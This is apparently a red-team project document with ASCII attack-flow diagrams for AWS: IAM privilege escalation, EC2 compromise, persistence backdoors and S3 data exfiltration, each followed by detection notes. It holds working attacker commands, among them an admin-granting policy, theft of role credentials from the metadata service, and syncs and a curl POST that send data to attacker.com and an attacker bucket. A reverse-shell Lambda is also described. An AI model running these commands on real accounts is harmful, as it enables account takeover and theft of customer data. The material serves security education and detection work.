# Project 4: Red Team AWS - UML Diagrams, Attack Flows & System Architecture
## Component Interactions, Exploitation Chains & Persistence Mechanisms

---

## PART 1: IAM PRIVILEGE ESCALATION ATTACK PATHS

### 1.1 Privilege Escalation Attack Chain Diagram

```
IAM PRIVILEGE ESCALATION PATHS
═══════════════════════════════════════════════════════════════════════════════

INITIAL STATE: Low-privilege attacker (compromised IAM user)
┌────────────────────────────────────────────────────────────────┐
│ Compromised IAM User                                            │
│ ├─ Permissions: s3:GetObject, iam:ListPolicies (LIMITED)      │
│ └─ Goal: Escalate to full admin access                         │
└────────────────────────────────────────────────────────────────┘
                              ↓
STEP 1: Find Policy Vulnerabilities (5 methods to check)
┌────────────────────────────────────────────────────────────────┐
│ 1. Check if can create inline policies                          │
│    └─ iam:PutUserPolicy → Add admin policy to self             │
│                                                                 │
│ 2. Check if can update managed policies                         │
│    └─ iam:CreatePolicyVersion → Create new admin version       │
│                                                                 │
│ 3. Check if can assume privileged role                          │
│    └─ sts:AssumeRole → Assume admin role (if trust allows)    │
│                                                                 │
│ 4. Check if can modify other users' permissions                │
│    └─ iam:AttachUserPolicy → Attach admin policy              │
│                                                                 │
│ 5. Check if can add SSH keys to other users                    │
│    └─ iam:PutSSHPublicKey → Add attacker's key                │
└────────────────────────────────────────────────────────────────┘
                              ↓
STEP 2: Execute Escalation (if vulnerability found)
┌────────────────────────────────────────────────────────────────┐
│ EXAMPLE: Path A - PutUserPolicy Vulnerability                  │
│                                                                 │
│ $ aws iam put-user-policy \                                    │
│   --user-name $(aws iam get-user --query 'User.UserName' -o text) \
│   --policy-name AdminPolicy \                                  │
│   --policy-document '{                                         │
│       "Version": "2012-10-17",                                │
│       "Statement": [{                                          │
│           "Effect": "Allow",                                   │
│           "Action": "*",                                       │
│           "Resource": "*"                                      │
│       }]                                                       │
│   }'                                                           │
│                                                                 │
│ RESULT: Attacker now has full admin access!                   │
│         Can do anything in AWS account                         │
│                                                                 │
│ EXAMPLE: Path B - AssumeRole Vulnerability                     │
│                                                                 │
│ 1. List all roles                                              │
│    $ aws iam list-roles                                        │
│                                                                 │
│ 2. Check if role allows current user to assume                 │
│    (Look for Trust Relationship with wildcard "*")             │
│                                                                 │
│ 3. Assume privileged role                                      │
│    $ aws sts assume-role --role-arn arn:aws:iam::...:role/Admin\
│      --role-session-name attacker-session                      │
│                                                                 │
│ 4. Use temporary credentials (exported as env vars)            │
│    $ export AWS_ACCESS_KEY_ID=...                              │
│    $ export AWS_SECRET_ACCESS_KEY=...                          │
│    $ aws s3 ls  ← Now can list all S3 buckets!                │
└────────────────────────────────────────────────────────────────┘
                              ↓
FINAL STATE: Full Administrator Access
┌────────────────────────────────────────────────────────────────┐
│ Now can:                                                       │
│ ├─ Read all data (S3, RDS, DynamoDB, etc.)                    │
│ ├─ Create backdoors (Lambda functions, IAM users)              │
│ ├─ Launch instances (botnets, crypto-miners)                   │
│ ├─ Delete critical resources (extortion)                       │
│ ├─ Modify billing alerts (hide malicious activity)             │
│ ├─ Disable CloudTrail (audit log evasion)                      │
│ └─ Steal credentials (Secrets Manager, environment vars)       │
└────────────────────────────────────────────────────────────────┘

DETECTION OPPORTUNITIES:
✓ CloudTrail logs show iam:PutUserPolicy call
✓ IAM policy change alerts (if configured)
✓ AssumeRole cross-account/cross-role assumption
✓ Unusual API calls from this user
⚠ If CloudTrail disabled, harder to detect
```

---

## PART 2: EC2 INSTANCE COMPROMISE & PERSISTENCE

### 2.1 EC2 Lateral Movement Attack Flow

```
EC2 COMPROMISE & PERSISTENCE MECHANISM
═══════════════════════════════════════════════════════════════════════════════

PHASE 1: INITIAL ACCESS - EC2 Instance Discovery & Exploitation
┌────────────────────────────────────────────────────────────────┐
│ 1. Enumerate EC2 instances (across all regions)                │
│    $ aws ec2 describe-instances --region us-east-1             │
│    → Find: i-0123456789abcdef (Linux instance)                 │
│            web-server.example.com (172.31.0.10)                │
│                                                                 │
│ 2. Check security group rules                                  │
│    $ aws ec2 describe-security-groups --group-ids sg-12345     │
│    → Found: Allows SSH (22) from 0.0.0.0/0 (EXPOSED!)          │
│             Allows HTTP (80) from 0.0.0.0/0                    │
│             Allows HTTPS (443) from 0.0.0.0/0                  │
│                                                                 │
│ 3. Attempt SSH connection (try default credentials)            │
│    $ ssh -i key.pem ec2-user@web-server.example.com            │
│    → Success! (or find exposed SSH key in S3)                  │
│                                                                 │
│ 4. Retrieve EC2 instance metadata (IMDSv1 exploit)             │
│    $ curl http://169.254.169.254/latest/meta-data/            │
│    → Get: instance-id, instance-type, availability-zone        │
│                                                                 │
│ 5. Extract IAM role credentials (from metadata service)        │
│    $ curl http://169.254.169.254/latest/meta-data/iam/\        │
│            security-credentials/EC2-Instance-Role              │
│    → Get: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY             │
│            AWS_SESSION_TOKEN (temporary credentials)           │
│                                                                 │
│ RESULT: Now have access as the EC2 instance's IAM role         │
│         Can access all resources that role permits             │
└────────────────────────────────────────────────────────────────┘
                              ↓
PHASE 2: PERSISTENCE - Lambda Backdoor Deployment
┌────────────────────────────────────────────────────────────────┐
│ 1. Deploy Lambda function (triggered by CloudWatch Events)     │
│    ├─ Function: Runs every 6 hours                            │
│    ├─ Code: Creates reverse shell back to attacker            │
│    ├─ Execution role: Instance's IAM role (inherited access)   │
│    └─ Result: Persistent access even if EC2 rebooted           │
│                                                                 │
│ 2. Alternative Persistence: IAM User Backdoor                  │
│    ├─ Create new IAM user: "deploy-service"                    │
│    ├─ Add SSH public key (attacker's)                         │
│    ├─ Attach admin policies                                    │
│    └─ Result: Can SSH back in anytime (independent of EC2)     │
│                                                                 │
│ 3. CloudWatch Agent Backdoor                                   │
│    ├─ Modify CloudWatch agent config                           │
│    ├─ Add command execution on log receipt                     │
│    └─ Trigger: When any log appears → execute shell            │
└────────────────────────────────────────────────────────────────┘
                              ↓
PHASE 3: LATERAL MOVEMENT - Access Other Resources
┌────────────────────────────────────────────────────────────────┐
│ With extracted credentials (from instance metadata), can:       │
│                                                                 │
│ 1. Access S3 buckets (read code, configs, secrets)             │
│    $ aws s3 ls s3://company-config-bucket/                     │
│    $ aws s3 cp s3://company-config-bucket/app-secrets.json .   │
│    → Extract: Database passwords, API keys, encryption keys    │
│                                                                 │
│ 2. Connect to RDS database (if in security group whitelist)    │
│    $ mysql -h rds-instance.amazonaws.com -u admin -p<password> │
│    → Access: Customer data, transactions, sensitive info       │
│                                                                 │
│ 3. Read Secrets Manager secrets                                │
│    $ aws secretsmanager get-secret-value --secret-id prod/db   │
│    → Extract: More credentials, API tokens                     │
│                                                                 │
│ 4. Assume other roles (if trust relationship allows)           │
│    $ aws sts assume-role --role-arn arn:aws:iam::...:role/...  │
│    → Escalate: Access different services/accounts              │
│                                                                 │
│ 5. Deploy Lambda function (if Lambda permissions exist)        │
│    $ aws lambda create-function --function-name exfil...       │
│    → Deploy: Persistent exfiltration backdoor                  │
└────────────────────────────────────────────────────────────────┘

ATTACK TIMELINE:
├─ T+0 min: Initial SSH access to EC2
├─ T+5 min: Extract metadata credentials
├─ T+10 min: Download S3 config files (containing secrets)
├─ T+15 min: Deploy Lambda persistence
├─ T+20 min: Connect to RDS database
├─ T+30 min: Begin data exfiltration
├─ T+60 min: Escalate to full AWS admin (via IAM escalation)
└─ T+90 min: Deploy cross-account backdoor (if multi-account)

DETECTION & PREVENTION:
✓ Disable IMDSv1 (require IMDSv2 with session tokens)
✓ CloudTrail alerts on privilege escalation attempts
✓ VPC Flow Logs detect unusual outbound connections
✓ CloudWatch alerts on Lambda creation/modification
✓ AWS Config rules detect unencrypted RDS instances
✗ If CloudTrail disabled → much harder to detect
```

---

## PART 3: S3 DATA EXFILTRATION ATTACK FLOW

```
S3 BUCKET COMPROMISE & DATA EXFILTRATION
═══════════════════════════════════════════════════════════════════════════════

ATTACK SCENARIO: Attacker has AWS credentials (from EC2 metadata)
└─ Goal: Find, extract, and exfiltrate sensitive data from S3

STEP 1: S3 BUCKET ENUMERATION & ANALYSIS
┌────────────────────────────────────────────────────────────────┐
│ $ aws s3 ls  (list all buckets accessible to current account)  │
│                                                                 │
│ Output:                                                         │
│ 2024-01-15 10:23:45 prod-database-backups    (FOUND!)         │
│ 2024-01-15 10:45:22 company-configs                           │
│ 2024-01-15 11:00:00 customer-data-prod                        │
│ 2024-01-15 11:15:30 logs-archive                              │
│                                                                 │
│ For each bucket, check:                                        │
│ 1. Bucket policy (who can access?)                             │
│    $ aws s3api get-bucket-policy --bucket prod-database-backups│
│                                                                 │
│ 2. ACL (public readable?)                                      │
│    $ aws s3api get-bucket-acl --bucket prod-database-backups   │
│                                                                 │
│ 3. Versioning (deleted objects recoverable?)                   │
│    $ aws s3api get-bucket-versioning --bucket ...              │
│                                                                 │
│ 4. Encryption (at-rest encryption enabled?)                    │
│    $ aws s3api get-bucket-encryption --bucket ...              │
│                                                                 │
│ FINDINGS:                                                       │
│ ├─ prod-database-backups: ACL allows public read (CRITICAL!)   │
│ ├─ company-configs: Contains hardcoded credentials (found!)     │
│ ├─ customer-data-prod: 500 GB of unencrypted customer data    │
│ └─ logs-archive: Accessible, no versioning, deletion possible  │
└────────────────────────────────────────────────────────────────┘
                              ↓
STEP 2: DATA EXTRACTION
┌────────────────────────────────────────────────────────────────┐
│ Example 1: Download sensitive configuration file               │
│ $ aws s3 cp s3://company-configs/app-config.json .             │
│ $ cat app-config.json                                          │
│ {                                                              │
│   "db_password": "SuperSecureP@ssw0rd123!",  ← Exposed!       │
│   "api_key": "sk_live_abc123xyz456",          ← Exposed!      │
│   "encryption_key": "base64encodedsecret..."  ← Exposed!      │
│ }                                                              │
│                                                                 │
│ Example 2: Download database backup (contains customer data)   │
│ $ aws s3 cp s3://prod-database-backups/2024-01-15.sql.gz .    │
│ $ gunzip 2024-01-15.sql.gz                                     │
│ $ wc -l 2024-01-15.sql                                         │
│ 50,000,000 lines (millions of customer records!)                │
│                                                                 │
│ Example 3: Download customer data (encrypted or not)           │
│ $ aws s3 sync s3://customer-data-prod ./data/ --recursive      │
│ (Downloads 500 GB of customer records: names, emails, SSNs)    │
│                                                                 │
│ Example 4: Modify objects (data poisoning)                     │
│ $ aws s3 cp malicious.exe s3://company-configs/app.exe         │
│ (Replace legitimate config/binary with backdoored version)     │
└────────────────────────────────────────────────────────────────┘
                              ↓
STEP 3: EXFILTRATION (Get data out)
┌────────────────────────────────────────────────────────────────┐
│ Method 1: Use S3 presigned URLs                                │
│ $ aws s3 presign s3://customer-data-prod/2024/customer.json \  │
│   --expires-in 86400  (valid for 24 hours)                     │
│ → https://bucket.s3.amazonaws.com/... (shareable URL)         │
│   Send to attacker's account (cross-account transfer)          │
│                                                                 │
│ Method 2: Sync to attacker's S3 bucket                         │
│ $ aws s3 sync s3://company-configs ./configs/ --recursive      │
│ $ aws s3 sync ./configs/ s3://attacker-bucket-12345/           │
│ → Data transferred to attacker's AWS account                   │
│                                                                 │
│ Method 3: Download to EC2, then exfil via internet             │
│ $ aws s3 cp s3://customer-data-prod/data.tar.gz /tmp/          │
│ $ curl -X POST -d @/tmp/data.tar.gz \                          │
│   https://attacker.com/exfil  (send to attacker server)        │
│ (Note: VPC Flow Logs may detect this)                          │
│                                                                 │
│ Method 4: Use CloudFront distribution                          │
│ $ Create CloudFront distribution → S3 bucket                   │
│ $ Access via CDN → Download massive amounts without throttle   │
│ (Bypasses some rate limiting)                                  │
└────────────────────────────────────────────────────────────────┘

IMPACT SUMMARY:
├─ Customer data compromised (PII, SSN, addresses)
├─ Database credentials exposed (access to prod DB)
├─ API keys stolen (can call APIs as legitimate user)
├─ Encryption keys exposed (can decrypt other data)
├─ Financial loss: $100K-$1M+ (GDPR fines, incident response)
├─ Reputational damage: Major news coverage
├─ Lawsuits: Customer class-action + regulatory
└─ Operational: System downtime, business interruption

DETECTION:
✓ CloudTrail logs show s3:GetObject for sensitive files
✓ S3 access logs show large bulk downloads
✓ CloudWatch alerts on unusual bucket access patterns
✓ VPC Flow Logs show exfiltration to external IPs
✓ AWS Config could have detected public bucket ACL
✗ If logging disabled → no detection possible
```

---

**Document Version:** 1.0  
**Last Updated:** December 15, 2025  
**Attack Paths Documented:** 20+
**Persistence Mechanisms:** 10+
**Severity Rating:** CRITICAL (all attacks shown)
